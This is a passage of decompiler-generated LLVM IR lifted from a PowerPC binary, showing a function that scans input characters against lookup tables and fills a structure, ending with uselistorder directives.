  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_10006338 = load i8, i8* %v1_10006314, align 1
  %v3_10006338 = zext i8 %v2_10006338 to i32
  store i32 %v3_10006338, i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000e080.234 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006344

dec_label_pc_10006344:                            ; preds = %dec_label_pc_10006350, %dec_label_pc_10006338
  %v0_10006350 = phi i32 [ %v1_10006350, %dec_label_pc_10006350 ], [ ptrtoint ([9 x i8]* @global_var_1000e080.234 to i32), %dec_label_pc_10006338 ]
  %v1_10006344 = inttoptr i32 %v0_10006350 to i8*
  %v2_10006344 = load i8, i8* %v1_10006344, align 1
  %v3_10006344 = zext i8 %v2_10006344 to i32
  store i32 %v3_10006344, i32* %r0.global-to-local, align 4
  %v4_10006348 = icmp eq i8 %v2_10006338, %v2_10006344
  br i1 %v4_10006348, label %dec_label_pc_10006114, label %dec_label_pc_10006350

dec_label_pc_10006350:                            ; preds = %dec_label_pc_10006344
  %v1_10006350 = add i32 %v0_10006350, 1
  %v2_10006350 = inttoptr i32 %v1_10006350 to i8*
  %v3_10006350 = load i8, i8* %v2_10006350, align 1
  %v4_10006350 = zext i8 %v3_10006350 to i32
  store i32 %v4_10006350, i32* %r0.global-to-local, align 4
  store i32 %v1_10006350, i32* %r11.global-to-local, align 4
  %v3_10006354 = icmp eq i8 %v3_10006350, 0
  br i1 %v3_10006354, label %dec_label_pc_1000635c, label %dec_label_pc_10006344

dec_label_pc_1000635c:                            ; preds = %dec_label_pc_10006350, %dec_label_pc_10006114
  %v0_10006384 = phi i32 [ %v1_10006114, %dec_label_pc_10006114 ], [ %v0_10006314, %dec_label_pc_10006350 ]
  %v0_10006380 = phi i32 [ %v0_10006350, %dec_label_pc_10006114 ], [ %v1_10006350, %dec_label_pc_10006350 ]
  %v2_10006364 = sub i32 %v0_10006380, ptrtoint ([9 x i8]* @global_var_1000e080.234 to i32)
  store i32 %v2_10006364, i32* %r9.global-to-local, align 4
  %v2_10006368 = icmp sgt i32 %v2_10006364, 1
  br i1 %v2_10006368, label %dec_label_pc_10006388, label %dec_label_pc_10006370

dec_label_pc_10006370:                            ; preds = %dec_label_pc_1000635c
  %v1_10006370 = inttoptr i32 %v0_10006384 to i8*
  %v2_10006370 = load i8, i8* %v1_10006370, align 1
  %v3_10006370 = zext i8 %v2_10006370 to i32
  store i32 %v3_10006370, i32* %r0.global-to-local, align 4
  %v1_10006374 = inttoptr i32 %v0_10006380 to i8*
  %v2_10006374 = load i8, i8* %v1_10006374, align 1
  %v3_10006374 = zext i8 %v2_10006374 to i32
  store i32 %v3_10006374, i32* %r9.global-to-local, align 4
  %v4_10006378 = icmp eq i8 %v2_10006370, %v2_10006374
  br i1 %v4_10006378, label %dec_label_pc_10006380, label %dec_label_pc_10006388

dec_label_pc_10006380:                            ; preds = %dec_label_pc_10006370
  %v1_10006380 = add i32 %v0_10006380, 9
  store i32 %v1_10006380, i32* %r11.global-to-local, align 4
  %v1_10006384 = add i32 %v0_10006384, 1
  store i32 %v1_10006384, i32* @r30, align 4
  br label %dec_label_pc_10006388

dec_label_pc_10006388:                            ; preds = %dec_label_pc_10006370, %dec_label_pc_1000635c, %dec_label_pc_10006380
  %v0_1000638c = phi i32 [ %v0_10006380, %dec_label_pc_10006370 ], [ %v0_10006380, %dec_label_pc_1000635c ], [ %v1_10006380, %dec_label_pc_10006380 ]
  %v0_10006388 = phi i32 [ %v0_10006384, %dec_label_pc_10006370 ], [ %v0_10006384, %dec_label_pc_1000635c ], [ %v1_10006384, %dec_label_pc_10006380 ]
  %v1_10006388 = inttoptr i32 %v0_10006388 to i8*
  %v2_10006388 = load i8, i8* %v1_10006388, align 1
  %v3_10006388 = zext i8 %v2_10006388 to i32
  store i32 %v3_10006388, i32* %r10.global-to-local, align 4
  %v1_1000638c = add i32 %v0_1000638c, 9
  %v2_1000638c = inttoptr i32 %v1_1000638c to i8*
  %v3_1000638c = load i8, i8* %v2_1000638c, align 1
  %v4_1000638c = zext i8 %v3_1000638c to i32
  store i32 %v4_1000638c, i32* %r0.global-to-local, align 4
  %v3_10006390 = icmp eq i8 %v2_10006388, 0
  %v1_10006394 = mul nuw nsw i32 %v4_1000638c, 256
  store i32 %v1_10006394, i32* %r8.global-to-local, align 4
  br i1 %v3_10006390, label %dec_label_pc_100065cc, label %dec_label_pc_1000639c

dec_label_pc_1000639c:                            ; preds = %dec_label_pc_10006388
  %v3_100063a0 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_100063a0, i32* %r11.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000e0c0.235 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r3.global-to-local, align 4
  %v1_100063ac = and i32 %v1_10006394, 1024
  store i32 %v1_100063ac, i32* %r0.global-to-local, align 4
  %v3_100063ac = icmp eq i32 %v1_100063ac, 0
  store i32 ptrtoint (i32* @global_var_1000e0b4.236 to i32), i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000e0c0.235 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100063bc

dec_label_pc_100063bc:                            ; preds = %dec_label_pc_10006420, %dec_label_pc_1000639c
  %v1_100063c8 = phi i32 [ %v1_10006420, %dec_label_pc_10006420 ], [ ptrtoint ([21 x i8]* @global_var_1000e0c0.235 to i32), %dec_label_pc_1000639c ]
  %v1_100063bc = inttoptr i32 %v1_100063c8 to i8*
  %v2_100063bc = load i8, i8* %v1_100063bc, align 1
  %v3_100063bc = zext i8 %v2_100063bc to i32
  store i32 %v3_100063bc, i32* %r0.global-to-local, align 4
  %v4_100063c0 = icmp eq i8 %v2_100063bc, %v2_10006388
  br i1 %v4_100063c0, label %dec_label_pc_100063c8, label %dec_label_pc_10006420

dec_label_pc_100063c8:                            ; preds = %dec_label_pc_100063bc
  %v2_100063c8 = sub i32 %v1_100063c8, ptrtoint ([21 x i8]* @global_var_1000e0c0.235 to i32)
  %tmp61 = icmp slt i32 %v2_100063c8, 18
  %brmerge = or i1 %v3_100063ac, %tmp61
  br i1 %brmerge, label %dec_label_pc_100063dc, label %dec_label_pc_100063d8

dec_label_pc_100063d8:                            ; preds = %dec_label_pc_100063c8
  %v1_100063d8 = add i32 %v2_100063c8, -2
  br label %dec_label_pc_100063dc

dec_label_pc_100063dc:                            ; preds = %dec_label_pc_100063c8, %dec_label_pc_100063d8
  %storemerge = phi i32 [ %v1_100063d8, %dec_label_pc_100063d8 ], [ %v2_100063c8, %dec_label_pc_100063c8 ]
  %v0_100063dc = phi i32 [ %v1_100063d8, %dec_label_pc_100063d8 ], [ %v2_100063c8, %dec_label_pc_100063c8 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100063dc = load i32, i32* @r28, align 4
  %v2_100063dc = add i32 %v1_100063dc, 32
  %v3_100063dc = inttoptr i32 %v2_100063dc to i32*
  store i32 %v0_100063dc, i32* %v3_100063dc, align 4
  store i32 ptrtoint (i32* @global_var_1000e0b3.237 to i32), i32* %r11.global-to-local, align 4
  %v0_100063e8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100063e4

dec_label_pc_100063e4:                            ; preds = %dec_label_pc_100063e4, %dec_label_pc_100063dc
  %v0_100063e4 = phi i32 [ %v1_100063e4, %dec_label_pc_100063e4 ], [ ptrtoint (i32* @global_var_1000e0b3.237 to i32), %dec_label_pc_100063dc ]
  %v1_100063e4 = add i32 %v0_100063e4, 1
  %v2_100063e4 = inttoptr i32 %v1_100063e4 to i8*
  %v3_100063e4 = load i8, i8* %v2_100063e4, align 1
  %v4_100063e4 = zext i8 %v3_100063e4 to i32
  store i32 %v4_100063e4, i32* %r0.global-to-local, align 4
  store i32 %v1_100063e4, i32* %r11.global-to-local, align 4
  %v3_100063e8 = icmp sgt i32 %v0_100063e8.pre, %v4_100063e4
  br i1 %v3_100063e8, label %dec_label_pc_100063e4, label %dec_label_pc_100063f0

dec_label_pc_100063f0:                            ; preds = %dec_label_pc_100063e4
  %v0_100063f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_100063f0 = sub i32 %v1_100063e4, %v0_100063f0
  %v1_100063f8 = mul i32 %v2_100063f0, 2
  store i32 %v1_100063f8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e0a4.238 to i32), i32* %r9.global-to-local, align 4
  %v2_10006400 = add i32 %v1_100063f8, ptrtoint (i32* @global_var_1000e0a4.238 to i32)
  %v3_10006400 = inttoptr i32 %v2_10006400 to i16*
  %v4_10006400 = load i16, i16* %v3_10006400, align 2
  %v5_10006400 = sext i16 %v4_10006400 to i32
  store i32 %v5_10006400, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e094.239 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000e0c0.235 to i32), i32* %r7.global-to-local, align 4
  %v2_10006410 = add i32 %v1_100063f8, ptrtoint (i32* @global_var_1000e094.239 to i32)
  %v3_10006410 = inttoptr i32 %v2_10006410 to i16*
  %v4_10006410 = load i16, i16* %v3_10006410, align 2
  %v5_10006410 = sext i16 %v4_10006410 to i32
  store i32 %v5_10006410, i32* %r0.global-to-local, align 4
  %v2_10006414 = or i32 %v5_10006400, %v1_10006394
  %v2_10006418 = and i32 %v5_10006410, %v2_10006414
  store i32 %v2_10006418, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000642c

dec_label_pc_10006420:                            ; preds = %dec_label_pc_100063bc
  %v1_10006420 = add i32 %v1_100063c8, 1
  %v2_10006420 = inttoptr i32 %v1_10006420 to i8*
  %v3_10006420 = load i8, i8* %v2_10006420, align 1
  %v4_10006420 = zext i8 %v3_10006420 to i32
  store i32 %v4_10006420, i32* %r0.global-to-local, align 4
  store i32 %v1_10006420, i32* %r7.global-to-local, align 4
  %v3_10006424 = icmp eq i8 %v3_10006420, 0
  br i1 %v3_10006424, label %dec_label_pc_1000642c, label %dec_label_pc_100063bc

dec_label_pc_1000642c:                            ; preds = %dec_label_pc_10006420, %dec_label_pc_100063f0
  %v0_1000642c = phi i32 [ %v2_10006418, %dec_label_pc_100063f0 ], [ %v3_100063a0, %dec_label_pc_10006420 ]
  store i32 %v0_1000642c, i32* %stack_var_-96, align 4
  %v0_10006430 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006430 = call i32 @__asm_rlwinm(i32 %v0_10006430, i32 30, i32 31, i32 31)
  %not.v2_10006434 = icmp eq i32 %v1_10006430, 0
  %v6_10006438 = sext i1 %not.v2_10006434 to i32
  store i32 %v6_10006438, i32* %r9.global-to-local, align 4
  %v1_1000643c = call i32 @__asm_rlwinm(i32 %v1_10006394, i32 0, i32 20, i32 23)
  store i32 %v1_1000643c, i32* %r0.global-to-local, align 4
  %v0_10006440 = load i32, i32* @r30, align 4
  %v1_10006440 = inttoptr i32 %v0_10006440 to i8*
  %v2_10006440 = load i8, i8* %v1_10006440, align 1
  %v3_10006440 = zext i8 %v2_10006440 to i32
  store i32 %v3_10006440, i32* %r10.global-to-local, align 4
  %v1_10006444 = call i32 @__asm_rlwinm(i32 %v6_10006438, i32 0, i32 0, i32 27)
  store i32 %v1_10006444, i32* %r9.global-to-local, align 4
  %v0_10006448 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006448 = call i32 @__asm_rlwinm(i32 %v0_10006448, i32 0, i32 30, i32 28)
  %v1_1000644c = add i32 %v1_10006444, 48
  store i32 %v1_1000644c, i32* %r9.global-to-local, align 4
  %v2_10006450 = or i32 %v1_10006448, %v1_1000643c
  store i32 %v2_10006450, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v0_10006458 = load i32, i32* %r10.global-to-local, align 4
  %v1_10006458 = load i32, i32* @r28, align 4
  %v2_10006458 = add i32 %v1_10006458, 12
  %v3_10006458 = inttoptr i32 %v2_10006458 to i32*
  store i32 %v0_10006458, i32* %v3_10006458, align 4
  %v0_1000645c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000645c = load i32, i32* @r28, align 4
  %v2_1000645c = add i32 %v1_1000645c, 4
  %v3_1000645c = inttoptr i32 %v2_1000645c to i32*
  store i32 %v0_1000645c, i32* %v3_1000645c, align 4
  %v0_10006460 = load i32, i32* @r31, align 4
  %v1_10006460 = load i32, i32* @r28, align 4
  %v2_10006460 = add i32 %v1_10006460, 8
  %v3_10006460 = inttoptr i32 %v2_10006460 to i32*
  store i32 %v0_10006460, i32* %v3_10006460, align 4
  %v0_10006464 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006464 = load i32, i32* @r28, align 4
  %v2_10006464 = add i32 %v1_10006464, 20
  %v3_10006464 = inttoptr i32 %v2_10006464 to i32*
  store i32 %v0_10006464, i32* %v3_10006464, align 4
  %v0_10006468 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006468 = load i32, i32* @r28, align 4
  %v2_10006468 = add i32 %v1_10006468, 16
  %v3_10006468 = inttoptr i32 %v2_10006468 to i32*
  store i32 %v0_10006468, i32* %v3_10006468, align 4
  %v0_1000646c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000646c = load i32, i32* @r28, align 4
  %v2_1000646c = add i32 %v1_1000646c, 28
  %v3_1000646c = inttoptr i32 %v2_1000646c to i32*
  store i32 %v0_1000646c, i32* %v3_1000646c, align 4
  %v0_10006470 = load i32, i32* %r7.global-to-local, align 4
  %v1_10006470 = inttoptr i32 %v0_10006470 to i8*
  %v2_10006470 = load i8, i8* %v1_10006470, align 1
  %v3_10006470 = zext i8 %v2_10006470 to i32
  store i32 %v3_10006470, i32* %r9.global-to-local, align 4
  %v3_10006474 = icmp eq i8 %v2_10006470, 0
  br i1 %v3_10006474, label %dec_label_pc_1000647c, label %dec_label_pc_10006494

dec_label_pc_1000647c:                            ; preds = %dec_label_pc_1000642c
  %v0_1000647c = load i32, i32* @r30, align 4
  %v1_1000647c = inttoptr i32 %v0_1000647c to i8*
  %v2_1000647c = load i8, i8* %v1_1000647c, align 1
  %v3_1000647c = zext i8 %v2_1000647c to i32
  store i32 %v3_1000647c, i32* %r0.global-to-local, align 4
  %v3_10006480 = icmp eq i8 %v2_1000647c, 109
  br i1 %v3_10006480, label %dec_label_pc_10006488, label %dec_label_pc_100065cc

dec_label_pc_10006488:                            ; preds = %dec_label_pc_1000647c
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000648c = load i32, i32* @r28, align 4
  %v2_1000648c = add i32 %v1_1000648c, 28
  %v3_1000648c = inttoptr i32 %v2_1000648c to i32*
  store i32 %v3_10006470, i32* %v3_1000648c, align 4
  %v0_10006490 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006490 = load i32, i32* @r28, align 4
  %v2_10006490 = add i32 %v1_10006490, 32
  %v3_10006490 = inttoptr i32 %v2_10006490 to i32*
  store i32 %v0_10006490, i32* %v3_10006490, align 4
  br label %dec_label_pc_10006494

dec_label_pc_10006494:                            ; preds = %dec_label_pc_1000642c, %dec_label_pc_10006488
  %v0_10006494 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_10006494, 1
  br i1 %tmp62, label %dec_label_pc_10006570, label %dec_label_pc_1000649c

dec_label_pc_1000649c:                            ; preds = %dec_label_pc_10006494
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_100064a0

dec_label_pc_100064a0:                            ; preds = %dec_label_pc_10006558, %dec_label_pc_1000649c
  %v0_100064c8 = phi i32 [ 0, %dec_label_pc_1000649c ], [ %v1_1000655c, %dec_label_pc_10006558 ]
  %v2_100064a0 = icmp sgt i32 %v0_100064c8, 2
  br i1 %v2_100064a0, label %dec_label_pc_100064c4, label %dec_label_pc_100064a8

dec_label_pc_100064a8:                            ; preds = %dec_label_pc_100064a0
  %v1_100064a8 = mul i32 %v0_100064c8, 4
  store i32 %v1_100064a8, i32* %r0.global-to-local, align 4
  %v0_100064ac = load i32, i32* @r1, align 4
  %v2_100064ac = add i32 %v0_100064ac, %v1_100064a8
  store i32 %v2_100064ac, i32* %r9.global-to-local, align 4
  %v1_100064b0 = add i32 %v2_100064ac, 20
  %v2_100064b0 = inttoptr i32 %v1_100064b0 to i32*
  %v3_100064b0 = load i32, i32* %v2_100064b0, align 4
  store i32 %v3_100064b0, i32* %r0.global-to-local, align 4
  %v1_100064b4 = load i32, i32* @r28, align 4
  %v2_100064b4 = add i32 %v1_100064b4, %v0_100064c8
  store i32 %v2_100064b4, i32* %r9.global-to-local, align 4
  %v1_100064b8 = urem i32 %v3_100064b0, 256
  store i32 %v1_100064b8, i32* %r11.global-to-local, align 4
  %v1_100064bc = trunc i32 %v3_100064b0 to i8
  %v3_100064bc = add i32 %v2_100064b4, 36
  %v4_100064bc = inttoptr i32 %v3_100064bc to i8*
  store i8 %v1_100064bc, i8* %v4_100064bc, align 1
  %v0_100064d0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100064d0

dec_label_pc_100064c4:                            ; preds = %dec_label_pc_100064a0
  %v2_100064c8 = add i32 %v0_100064c8, %stack_var_-84.3
  store i32 %v2_100064c8, i32* %r9.global-to-local, align 4
  %v1_100064cc = add i32 %v2_100064c8, -2
  store i32 %v1_100064cc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100064d0

dec_label_pc_100064d0:                            ; preds = %dec_label_pc_100064a8, %dec_label_pc_100064c4
  %v0_100064f0 = phi i32 [ %v0_100064d0.pre, %dec_label_pc_100064a8 ], [ %v1_100064cc, %dec_label_pc_100064c4 ]
  %v1_100064d0 = load i32, i32* @r26, align 4
  %v3_100064d0 = icmp sgt i32 %v0_100064f0, %v1_100064d0
  br i1 %v3_100064d0, label %dec_label_pc_100064d8, label %dec_label_pc_100064e4

dec_label_pc_100064d8:                            ; preds = %dec_label_pc_100064d0
  %v2_100064d8 = icmp sgt i32 %v0_100064f0, 9
  br i1 %v2_100064d8, label %dec_label_pc_100065cc, label %dec_label_pc_100064e0

dec_label_pc_100064e0:                            ; preds = %dec_label_pc_100064d8
  store i32 %v0_100064f0, i32* @r26, align 4
  br label %dec_label_pc_100064e4

dec_label_pc_100064e4:                            ; preds = %dec_label_pc_100064d0, %dec_label_pc_100064e0
  store i32 %v2_10006180.pre-phi, i32* %r9.global-to-local, align 4
  %v0_100064e8 = load i32, i32* @r27, align 4
  %v1_100064e8 = mul i32 %v0_100064e8, 4
  store i32 %v1_100064e8, i32* %r0.global-to-local, align 4
  %v2_100064ec = add i32 %v1_100064e8, %v2_10006180.pre-phi
  %v3_100064ec = inttoptr i32 %v2_100064ec to i32*
  %v4_100064ec = load i32, i32* %v3_100064ec, align 4
  store i32 %v4_100064ec, i32* @r31, align 4
  %v1_100064f0 = add i32 %v0_100064f0, -1
  store i32 %v1_100064f0, i32* @r25, align 4
  %v1_100064f4 = mul i32 %v1_100064f0, 4
  %v1_100064f8 = load i32, i32* @r28, align 4
  %v2_100064f8 = add i32 %v1_100064f8, %v1_100064f4
  store i32 %v2_100064f8, i32* %r9.global-to-local, align 4
  %v3_100064fc = icmp eq i32 %v4_100064ec, 8
  %v1_10006500 = add i32 %v2_100064f8, 40
  %v2_10006500 = inttoptr i32 %v1_10006500 to i32*
  %v3_10006500 = load i32, i32* %v2_10006500, align 4
  store i32 %v3_10006500, i32* %r3.global-to-local, align 4
  br i1 %v3_100064fc, label %dec_label_pc_10006558, label %dec_label_pc_10006508

dec_label_pc_10006508:                            ; preds = %dec_label_pc_100064e4
  %v3_10006508 = icmp eq i32 %v3_10006500, 8
  br i1 %v3_10006508, label %dec_label_pc_10006540, label %dec_label_pc_10006510

dec_label_pc_10006510:                            ; preds = %dec_label_pc_10006508
  %v4_10006510 = icmp eq i32 %v3_10006500, %v4_100064ec
  br i1 %v4_10006510, label %dec_label_pc_10006540, label %dec_label_pc_10006518

dec_label_pc_10006518:                            ; preds = %dec_label_pc_10006510
  %v1_10006518 = call i32 @function_10006088(i32 %v3_10006500)
  store i32 %v1_10006518, i32* @r29, align 4
  %v0_10006520 = load i32, i32* @r31, align 4
  store i32 %v0_10006520, i32* %r3.global-to-local, align 4
  %v1_10006524 = call i32 @function_10006088(i32 %v0_10006520)
  store i32 %v1_10006524, i32* %r3.global-to-local, align 4
  %v0_10006530 = call i32 @__asm_mfcr()
  store i32 %v0_10006530, i32* %r3.global-to-local, align 4
  store i32 %v0_10006530, i32* %r0.global-to-local, align 4
  %v1_10006534 = call i32 @__asm_rlwinm(i32 %v0_10006530, i32 31, i32 31, i32 31)
  store i32 %v1_10006534, i32* %r0.global-to-local, align 4
  %v3_10006538 = icmp eq i32 %v1_10006534, 0
  br i1 %v3_10006538, label %dec_label_pc_10006558, label %dec_label_pc_10006518.dec_label_pc_10006540_crit_edge

dec_label_pc_10006518.dec_label_pc_10006540_crit_edge: ; preds = %dec_label_pc_10006518
  %v0_10006544.pre = load i32, i32* @r27, align 4
  %v0_1000654c.pre = load i32, i32* @r25, align 4
  %v1_10006550.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006540

dec_label_pc_10006540:                            ; preds = %dec_label_pc_10006518.dec_label_pc_10006540_crit_edge, %dec_label_pc_10006510, %dec_label_pc_10006508
  %v1_10006550 = phi i32 [ %v1_10006550.pre, %dec_label_pc_10006518.dec_label_pc_10006540_crit_edge ], [ %v1_100064f8, %dec_label_pc_10006510 ], [ %v1_100064f8, %dec_label_pc_10006508 ]
  %v0_1000654c = phi i32 [ %v0_1000654c.pre, %dec_label_pc_10006518.dec_label_pc_10006540_crit_edge ], [ %v1_100064f0, %dec_label_pc_10006510 ], [ %v1_100064f0, %dec_label_pc_10006508 ]
  %v0_10006544 = phi i32 [ %v0_10006544.pre, %dec_label_pc_10006518.dec_label_pc_10006540_crit_edge ], [ %v0_100064e8, %dec_label_pc_10006510 ], [ %v0_100064e8, %dec_label_pc_10006508 ]
  store i32 %v2_10006180.pre-phi, i32* %r9.global-to-local, align 4
  %v1_10006544 = mul i32 %v0_10006544, 4
  store i32 %v1_10006544, i32* %r0.global-to-local, align 4
  %v2_10006548 = add i32 %v1_10006544, %v2_10006180.pre-phi
  %v3_10006548 = inttoptr i32 %v2_10006548 to i32*
  %v4_10006548 = load i32, i32* %v3_10006548, align 4
  store i32 %v4_10006548, i32* %r0.global-to-local, align 4
  %v1_1000654c = mul i32 %v0_1000654c, 4
  %v2_10006550 = add i32 %v1_1000654c, %v1_10006550
  store i32 %v2_10006550, i32* %r9.global-to-local, align 4
  %v2_10006554 = add i32 %v2_10006550, 40
  %v3_10006554 = inttoptr i32 %v2_10006554 to i32*
  store i32 %v4_10006548, i32* %v3_10006554, align 4
  br label %dec_label_pc_10006558

dec_label_pc_10006558:                            ; preds = %dec_label_pc_10006518, %dec_label_pc_100064e4, %dec_label_pc_10006540
  %v0_10006558 = load i32, i32* @r28, align 4
  %v1_10006558 = add i32 %v0_10006558, 28
  %v2_10006558 = inttoptr i32 %v1_10006558 to i32*
  %v3_10006558 = load i32, i32* %v2_10006558, align 4
  %v0_1000655c = load i32, i32* @r27, align 4
  %v1_1000655c = add i32 %v0_1000655c, 1
  store i32 %v1_1000655c, i32* @r27, align 4
  %v1_10006560 = add i32 %v3_10006558, 2
  store i32 %v1_10006560, i32* %r9.global-to-local, align 4
  %v2_10006564 = icmp slt i32 %v1_1000655c, %v1_10006560
  br i1 %v2_10006564, label %dec_label_pc_100064a0, label %dec_label_pc_10006588

dec_label_pc_10006570:                            ; preds = %dec_label_pc_10006494
  %v0_10006570 = load i32, i32* @r28, align 4
  %v1_10006570 = add i32 %v0_10006570, 28
  %v2_10006570 = inttoptr i32 %v1_10006570 to i32*
  %v3_10006570 = load i32, i32* %v2_10006570, align 4
  store i32 %v3_10006570, i32* %r5.global-to-local, align 4
  %v1_10006574 = add i32 %v0_10006570, 40
  store i32 %v1_10006574, i32* @r3, align 4
  %v0_10006578 = load i32, i32* %r8.global-to-local, align 4
  %v1_10006578 = trunc i32 %v0_10006578 to i8
  %v3_10006578 = add i32 %v0_10006570, 38
  %v4_10006578 = inttoptr i32 %v3_10006578 to i8*
  store i8 %v1_10006578, i8* %v4_10006578, align 1
  %v2_1000657c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000657c, i32* @r4, align 4
  %v0_10006580 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006580 = mul i32 %v0_10006580, 4
  store i32 %v1_10006580, i32* @r5, align 4
  store i32 268461448, i32* @lr, align 4
  %v0_10006584 = call i32 @function_10006d88()
  store i32 %v0_10006584, i32* %r3.global-to-local, align 4
  %v0_10006588.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006588

dec_label_pc_10006588:                            ; preds = %dec_label_pc_10006558, %dec_label_pc_10006570
  %v0_10006588 = phi i32 [ %v0_10006588.pre, %dec_label_pc_10006570 ], [ %v0_10006558, %dec_label_pc_10006558 ]
  %v1_10006588 = add i32 %v0_10006588, 16
  %v2_10006588 = inttoptr i32 %v1_10006588 to i32*
  %v3_10006588 = load i32, i32* %v2_10006588, align 4
  store i32 %v3_10006588, i32* %r0.global-to-local, align 4
  %v0_1000658c = load i32, i32* @r26, align 4
  %v2_1000658c = add i32 %v0_10006588, 24
  %v3_1000658c = inttoptr i32 %v2_1000658c to i32*
  store i32 %v0_1000658c, i32* %v3_1000658c, align 4
  %v0_10006590 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006590 = and i32 %v0_10006590, 128
  store i32 %v1_10006590, i32* %r9.global-to-local, align 4
  %v3_10006590 = icmp eq i32 %v1_10006590, 0
  br i1 %v3_10006590, label %dec_label_pc_10006598, label %dec_label_pc_100065a4

dec_label_pc_10006598:                            ; preds = %dec_label_pc_10006588
  %v0_10006598 = load i32, i32* @r30, align 4
  %v1_10006598 = add i32 %v0_10006598, 1
  store i32 %v1_10006598, i32* %r0.global-to-local, align 4
  %v1_1000659c = load i32, i32* @r28, align 4
  %v2_1000659c = inttoptr i32 %v1_1000659c to i32*
  store i32 %v1_10006598, i32* %v2_1000659c, align 4
  br label %dec_label_pc_100065bc

dec_label_pc_100065a4:                            ; preds = %dec_label_pc_10006588
  %v0_100065a4 = load i32, i32* @r28, align 4
  %v1_100065a4 = inttoptr i32 %v0_100065a4 to i32*
  %v2_100065a4 = load i32, i32* %v1_100065a4, align 4
  %v2_100065a8 = ptrtoint i32* %stack_var_-80 to i32
  %v1_100065ac = load i32, i32* @r30, align 4
  %v2_100065ac = sub i32 %v1_100065ac, %v2_100065a8
  %v1_100065b0 = mul i32 %v2_100065ac, 4
  store i32 %v1_100065b0, i32* %r0.global-to-local, align 4
  %v2_100065b4 = add i32 %v1_100065b0, %v2_100065a4
  store i32 %v2_100065b4, i32* %r9.global-to-local, align 4
  store i32 %v2_100065b4, i32* %v1_100065a4, align 4
  br label %dec_label_pc_100065bc

dec_label_pc_100065bc:                            ; preds = %dec_label_pc_10006598, %dec_label_pc_100065a4
  %v0_100065bc = load i32, i32* @r28, align 4
  %v1_100065bc = add i32 %v0_100065bc, 28
  %v2_100065bc = inttoptr i32 %v1_100065bc to i32*
  %v3_100065bc = load i32, i32* %v2_100065bc, align 4
  store i32 %v3_100065bc, i32* %r9.global-to-local, align 4
  %v1_100065c0 = add i32 %v3_100065bc, 2
  br label %dec_label_pc_100065cc

dec_label_pc_100065cc:                            ; preds = %dec_label_pc_10006130, %dec_label_pc_10006204, %dec_label_pc_100062e0, %dec_label_pc_100062d4, %dec_label_pc_100062fc, %dec_label_pc_10006238, %dec_label_pc_100064d8, %dec_label_pc_10006388, %dec_label_pc_1000647c, %dec_label_pc_100065bc
  %storemerge2 = phi i32 [ %v1_100065c0, %dec_label_pc_100065bc ], [ -1, %dec_label_pc_1000647c ], [ -1, %dec_label_pc_10006388 ], [ -1, %dec_label_pc_100064d8 ], [ -1, %dec_label_pc_10006238 ], [ -1, %dec_label_pc_100062fc ], [ -1, %dec_label_pc_100062d4 ], [ -1, %dec_label_pc_100062e0 ], [ -1, %dec_label_pc_10006204 ], [ -1, %dec_label_pc_10006130 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_100060cc, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_100065b0, { 1, 0 }
  uselistorder i32 %v0_10006588, { 1, 0 }
  uselistorder i32 %v1_1000655c, { 1, 2, 0 }
  uselistorder i32 %v1_10006544, { 1, 0 }
  uselistorder i32 %v0_10006530, { 0, 2, 1 }
  uselistorder i32 %v3_10006500, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100064f8, { 1, 2, 0 }
  uselistorder i32 %v1_100064f0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100064e8, { 1, 0 }
  uselistorder i32 %v0_100064e8, { 1, 2, 0 }
  uselistorder i32 %v3_100064b0, { 1, 0, 2 }
  uselistorder i32 %v1_100064a8, { 1, 0 }
  uselistorder i32 %v0_100064c8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10006420, { 1, 2, 0 }
  uselistorder i32 %v1_100063f8, { 2, 1, 0 }
  uselistorder i32 %v1_100063e4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100063c8, { 1, 0, 2 }
  uselistorder i32 %v1_10006394, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10006350, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10006314, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10006300, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10006270, { 0, 1, 3, 2 }
